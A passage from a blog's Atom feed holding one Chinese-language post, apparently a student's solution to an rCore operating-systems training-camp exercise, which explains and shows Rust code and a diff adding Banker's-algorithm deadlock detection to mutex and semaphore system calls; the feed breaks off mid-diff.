<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lordaeron_ESZ&#39;s blog</title>
  
  <subtitle>代码-游戏-数码-技术</subtitle>
  <link href="http://lordaeronesz.github.io/atom.xml" rel="self"/>
  
  <link href="http://lordaeronesz.github.io/"/>
  <updated>2024-11-04T11:44:44.447Z</updated>
  <id>http://lordaeronesz.github.io/</id>
  
  <author>
    <name>Chaoqun Zheng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2024开源操作系统训练营 rCore Chapter8练习</title>
    <link href="http://lordaeronesz.github.io/2024/11/04/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter8%E7%BB%83%E4%B9%A0/"/>
    <id>http://lordaeronesz.github.io/2024/11/04/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter8%E7%BB%83%E4%B9%A0/</id>
    <published>2024-11-04T15:30:11.000Z</published>
    <updated>2024-11-04T11:44:44.447Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编程作业"><a href="#编程作业" class="headerlink" title="编程作业"></a>编程作业</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>本实验要求为死锁和信号量机制实现死锁检测功能，并提供系统调用 <code>enable_deadlock_detect</code>，用以开启和关闭死锁检测功能。在开启死锁检测功能的情况下，用户使用 <code>mutex_lock</code> 或 <code>semaphore_down</code> 尝试获取互斥资源时，如果发现系统处于不安全状态（可能发生死锁）时拒绝对应的资源获取请求。</p><p>实验手册中介绍的死锁检测算法为银行家算法（Banker&#39;s Algorithm），由 Dijkstra 提出，算法的流程可以参照<a href="https://learningos.cn/rCore-Tutorial-Guide-2024A/chapter8/5exercise.html">手册</a>，这里不再详细介绍，代码实现如下：</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Banker's Algoritm for dead lock check</span><span class="token keyword">fn</span> <span class="token function-definition function">deadlock_check</span><span class="token punctuation">(</span>available<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span><span class="token punctuation">,</span> allocation<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">>></span><span class="token punctuation">,</span> need<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">>></span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// n: thread count  m: resources count</span>    <span class="token keyword">let</span> <span class="token punctuation">(</span>n<span class="token punctuation">,</span> m<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>allocation<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> allocation<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> work <span class="token operator">=</span> available<span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> finish <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token boolean">false</span><span class="token punctuation">;</span> n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">loop</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> idx <span class="token operator">=</span> <span class="token keyword">usize</span><span class="token punctuation">::</span><span class="token constant">MAX</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>n <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> <span class="token keyword">mut</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> finish<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>m <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> need<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> work<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>                    flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> flag <span class="token punctuation">&#123;</span>                idx <span class="token operator">=</span> i<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// has found a thread meet the requirement</span>        <span class="token keyword">if</span> idx <span class="token operator">!=</span> <span class="token keyword">usize</span><span class="token punctuation">::</span><span class="token constant">MAX</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>m <span class="token punctuation">&#123;</span>                work<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+=</span> allocation<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            finish<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    finish<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token operator">&amp;</span>x<span class="token closure-punctuation punctuation">|</span></span> x<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p>根据现有的 Available, Allocation 和 Need 来进行死锁的检测并不复杂，关键在于如何将这一算法融入现有的线程互斥机制中，更具体地说，如何维护内核中与此相关的状态，以便在进行死锁检测前能够正确构造出 Available, Allocation 和 Need 数据结构。</p><p>不妨先考虑更简单的情况：要想为锁机制实现死锁检测，如何维护其状态？首先需要保存当前线程需要哪把锁，需要明确的一点是：每个线程“需要”的资源只有 1 个，因为每个线程只有当所需的资源被满足后才会继续执行以获取更多资源，否则就会被阻塞。因此可以为线程控制块添加一个 <code>usize</code> 变量 <code>mutex_need</code> 来存储该线程当前需要锁资源的 id。除此之外，还需要一个向量 <code>mutex_allocation</code> 来存储线程已获取未释放锁资源的 id。</p><p>当使用 <code>sys_mutex_lock(mutex_id)</code> 尝试获取 <code>mutex_id</code> 的锁时，在使用 <code>mutex.lock()</code> 实际获取锁之前，将当前线程的 <code>mutex_need</code> 设置为 <code>mutex_id</code>，当线程成功获取锁资源后，将 <code>mutex_id</code> 放入 <code>mutex_allocation</code> 向量中，并将 <code>mutex_need</code> 设置为空（我这里采用的是将 <code>usize::MAX</code> 看作空，也可以使用 <code>Option</code> 类型，相对来说更优雅）。</p><p>当使用 <code>sys_mutex_unlock(mutex_id)</code> 尝试释放 <code>mutex_id</code> 的锁时，在使用 <code>mutex.unlock()</code> 实际释放锁之前，查找当前线程的 <code>mutex_allocation</code> 向量，移除值为 <code>mutex_id</code> 的元素。</p><p>实现上述逻辑后，就能在进行死锁检测前，根据所维护的信息将 Available, Allocation 和 Need 构造出来，作为银行家算法的参数，检测当前系统是否处于不安全状态，构造代码如下所示：</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">if</span> process_inner<span class="token punctuation">.</span>dlcheck_option <span class="token punctuation">&#123;</span>    <span class="token comment">// initialize data structure for Banker's Algorithm:</span>    <span class="token comment">// Avavilable Vector, Allocation Matrix, Need Matrix</span>    <span class="token keyword">let</span> n <span class="token operator">=</span> process_inner<span class="token punctuation">.</span>tasks<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> m <span class="token operator">=</span> process_inner<span class="token punctuation">.</span>mutex_list<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> available<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">;</span> m<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> allocation<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">>></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span> m<span class="token punctuation">]</span><span class="token punctuation">;</span> n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> need<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">>></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span> m<span class="token punctuation">]</span><span class="token punctuation">;</span> n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> task_opt<span class="token punctuation">)</span> <span class="token keyword">in</span> process_inner<span class="token punctuation">.</span>tasks<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">enumerate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">match</span> task_opt <span class="token punctuation">&#123;</span>            <span class="token class-name">Some</span><span class="token punctuation">(</span>task<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token keyword">let</span> task_inner <span class="token operator">=</span> task<span class="token punctuation">.</span><span class="token function">inner_exclusive_access</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> mid <span class="token keyword">in</span> <span class="token operator">&amp;</span>task_inner<span class="token punctuation">.</span>mutex_allocation <span class="token punctuation">&#123;</span>                    allocation<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">*</span>mid<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>                    available<span class="token punctuation">[</span><span class="token operator">*</span>mid<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">let</span> nid <span class="token operator">=</span> task_inner<span class="token punctuation">.</span>mutex_need<span class="token punctuation">;</span>                <span class="token keyword">if</span> nid <span class="token operator">!=</span> <span class="token keyword">usize</span><span class="token punctuation">::</span><span class="token constant">MAX</span> <span class="token punctuation">&#123;</span>                    need<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>nid<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token function">drop</span><span class="token punctuation">(</span>task_inner<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">None</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token operator">!</span><span class="token function">deadlock_check</span><span class="token punctuation">(</span>available<span class="token punctuation">,</span> allocation<span class="token punctuation">,</span> need<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">0xDEAD</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>信号量机制的实现大体相似，不过需要注意一些细节。</p><p>因为信号量的数量不再是二值的（有或没有），因此线程的资源分配向量中还需要包含每个信号量的数量，向量的元素可以选择用 <code>&lt;sem_id, cnt&gt;</code> 这样的二元组来表示，也可以用 <code>cnt</code> 个 <code>sem_id</code> 元素来表示这么一个二元组，我在这里采用的是前者。</p><p>另外，信号量还可以为负数，负数信号量的绝对值表示当前资源被提前“透支”的数量，而在银行家算法中，资源数量 <code>Available[i][j]</code> 不能为负数，此时应该将其看作 0。</p><pre class="language-rust" data-language="rust"><code class="language-rust">available<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">max</span><span class="token punctuation">(</span>sem_inner<span class="token punctuation">.</span>count<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>最后，当线程 A 提前“透支”信号量进入休眠状态，线程 B 释放资源后调用 <code>wakeup_task(task)</code> 尝试唤醒线程 A 前，设置线程 A 的 <code>sem_allocation</code> 向量。否则可能由于线程调度的不确定性，导致线程 B 在被 <code>sem_allocation</code> 未被设置的情况下被调度，从而后续的死锁检测出现错误，让系统意外地进入死锁的状态。</p><blockquote><p>有关这样做法的合理性原因，我也不是很确定，因为我在未遵守上述顺序的情况下，执行 <code>ch8_deadlock_sem2</code> 进入死锁的几率非常大（大约 90%），而这应该不全是线程调度的随机性所导致。</p></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/os/src/sync/semaphore.rs b/os/src/sync/semaphore.rsindex 509b504..5743172 100644<span class="token coord">--- a/os/src/sync/semaphore.rs</span><span class="token coord">+++ b/os/src/sync/semaphore.rs</span>@@ -36,6 +36,15 @@ impl Semaphore &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        inner.count += 1;</span><span class="token prefix unchanged"> </span><span class="token line">        if inner.count &lt;= 0 &#123;</span><span class="token prefix unchanged"> </span><span class="token line">            if let Some(task) = inner.wait_queue.pop_front() &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">                let sem_id = task_inner.sem_need;</span><span class="token prefix inserted">+</span><span class="token line">                match task_inner.sem_allocation.iter().position(|&amp;x| x.0 == sem_id) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    Some(index) => task_inner.sem_allocation[index].1 += 1,</span><span class="token prefix inserted">+</span><span class="token line">                    None => task_inner.sem_allocation.push((sem_id, 1)),</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">                task_inner.sem_need = usize::MAX;</span><span class="token prefix inserted">+</span><span class="token line">                drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">                </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                wakeup_task(task);</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span></span>@@ -50,6 +59,17 @@ impl Semaphore &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            inner.wait_queue.push_back(current_task().unwrap());</span><span class="token prefix unchanged"> </span><span class="token line">            drop(inner);</span><span class="token prefix unchanged"> </span><span class="token line">            block_current_and_run_next();</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        &#125; else &#123;</span><span class="token prefix inserted">+</span><span class="token line">            let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">            let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">            let sem_id = task_inner.sem_need;</span><span class="token prefix inserted">+</span><span class="token line">            match task_inner.sem_allocation.iter().position(|&amp;x| x.0 == sem_id) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                Some(index) => task_inner.sem_allocation[index].1 += 1,</span><span class="token prefix inserted">+</span><span class="token line">                None => task_inner.sem_allocation.push((sem_id, 1)),</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            task_inner.sem_need = usize::MAX;</span><span class="token prefix inserted">+</span><span class="token line">            drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">            drop(task);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex 31fa22a..82c0991 100644<span class="token coord">--- a/os/src/syscall/process.rs</span><span class="token coord">+++ b/os/src/syscall/process.rs</span><span class="token coord">@@ -1,11 +1,13 @@</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use core::mem::size_of;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    config::MAX_SYSCALL_NUM,</span><span class="token prefix unchanged"> </span><span class="token line">    fs::&#123;open_file, OpenFlags&#125;,</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    mm::&#123;translated_ref, translated_refmut, translated_str&#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    mm::&#123;translated_byte_buffer, translated_ref, translated_refmut, translated_str&#125;,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    task::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">        current_process, current_task, current_user_token, exit_current_and_run_next, pid2process,</span><span class="token prefix unchanged"> </span><span class="token line">        suspend_current_and_run_next, SignalFlags, TaskStatus,</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    &#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    &#125;, timer::get_time_us,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::&#123;string::String, sync::Arc, vec::Vec&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -164,10 +166,24 @@ pub fn sys_kill(pid: usize, signal: u32) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TimeVal`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_get_time NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_get_time",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().process.upgrade().unwrap().getpid()</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let _us = get_time_us();</span><span class="token prefix inserted">+</span><span class="token line">    let time_val = TimeVal &#123;</span><span class="token prefix inserted">+</span><span class="token line">        sec: _us / 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">        usec: _us % 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ts as *const u8, size_of::&lt;TimeVal>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut time_val_ptr = &amp;time_val as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr = time_val_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// task_info syscall</span></span>diff --git a/os/src/syscall/sync.rs b/os/src/syscall/sync.rsindex 290ee6f..6d25e65 100644<span class="token coord">--- a/os/src/syscall/sync.rs</span><span class="token coord">+++ b/os/src/syscall/sync.rs</span><span class="token coord">@@ -1,7 +1,11 @@</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use core::cmp::max;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::&#123;Condvar, Mutex, MutexBlocking, MutexSpin, Semaphore&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::task::&#123;block_current_and_run_next, current_process, current_task&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::timer::&#123;add_timer, get_time_ms&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::Arc;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use alloc::vec;</span><span class="token prefix inserted">+</span><span class="token line">use alloc::vec::Vec;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// sleep syscall</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_sleep(ms: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span>@@ -71,9 +75,75 @@ pub fn sys_mutex_lock(mutex_id: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    let process = current_process();</span><span class="token prefix unchanged"> </span><span class="token line">    let process_inner = process.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">    let mutex = Arc::clone(process_inner.mutex_list[mutex_id].as_ref().unwrap());</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    // set mutex_need to current</span><span class="token prefix inserted">+</span><span class="token line">    let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    task_inner.mutex_need = mutex_id;</span><span class="token prefix inserted">+</span><span class="token line">    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">    drop(task);</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    if process_inner.dlcheck_option &#123;</span><span class="token prefix inserted">+</span><span class="token line">        // initialize data structure for Banker's Algorithm:</span><span class="token prefix inserted">+</span><span class="token line">        // Avavilable Vector, Allocation Matrix, Need Matrix</span><span class="token prefix inserted">+</span><span class="token line">        let n = process_inner.tasks.len();</span><span class="token prefix inserted">+</span><span class="token line">        let m = process_inner.mutex_list.len();</span><span class="token prefix inserted">+</span><span class="token line">        let mut available: Vec&lt;usize> = vec![1; m];</span><span class="token prefix inserted">+</span><span class="token line">        let mut need: Vec&lt;Vec&lt;usize>> = vec![vec![0; m]; n];</span><span class="token prefix inserted">+</span><span class="token line">        let mut allocation: Vec&lt;Vec&lt;usize>> = vec![vec![0; m]; n];</span><span class="token prefix inserted">+</span><span class="token line">        for (i, task_opt) in process_inner.tasks.iter().enumerate() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            match task_opt &#123;</span><span class="token prefix inserted">+</span><span class="token line">                Some(task) => &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    let task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">                    for mid in &amp;task_inner.mutex_allocation &#123;</span><span class="token prefix inserted">+</span><span class="token line">                        allocation[i][*mid] += 1;</span><span class="token prefix inserted">+</span><span class="token line">                        available[*mid] -= 1;</span><span class="token prefix inserted">+</span><span class="token line">                    &#125;</span><span class="token prefix inserted">+</span><span class="token line">                    let nid = task_inner.mutex_need;</span><span class="token prefix inserted">+</span><span class="token line">                    if nid != usize::MAX &#123;</span><span class="token prefix inserted">+</span><span class="token line">                        need[i][nid] += 1;</span><span class="token prefix inserted">+</span><span class="token line">                    &#125;</span><span class="token prefix inserted">+</span><span class="token line">                    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">                None => &#123;&#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        if !deadlock_check(available, allocation, need) &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return -0xDEAD;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    drop(process_inner);</span><span class="token prefix unchanged"> </span><span class="token line">    drop(process);</span><span class="token prefix unchanged"> </span><span class="token line">    mutex.lock();</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    task_inner.mutex_allocation.push(mutex_id);</span><span class="token prefix inserted">+</span><span class="token line">    task_inner.mutex_need = usize::MAX;</span><span class="token prefix inserted">+</span><span class="token line">    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">    drop(task);</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    0</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line">/// mutex unlock syscall</span></span>@@ -89,11 +159,22 @@ pub fn sys_mutex_unlock(mutex_id: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            .unwrap()</span><span class="token prefix unchanged"> </span><span class="token line">            .tid</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    let process = current_process();</span><span class="token prefix unchanged"> </span><span class="token line">    let process_inner = process.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">    let mutex = Arc::clone(process_inner.mutex_list[mutex_id].as_ref().unwrap());</span><span class="token prefix unchanged"> </span><span class="token line">    drop(process_inner);</span><span class="token prefix unchanged"> </span><span class="token line">    drop(process);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    if let Some(index) = task_inner.mutex_allocation.iter().position(|&amp;x| x == mutex_id) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        task_inner.mutex_allocation.swap_remove(index);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">    drop(task);</span><span class="token prefix inserted">+</span><span class="token line">    </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    mutex.unlock();</span><span class="token prefix unchanged"> </span><span class="token line">    0</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>@@ -142,10 +223,21 @@ pub fn sys_semaphore_up(sem_id: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            .unwrap()</span><span class="token prefix unchanged"> </span><span class="token line">            .tid</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span 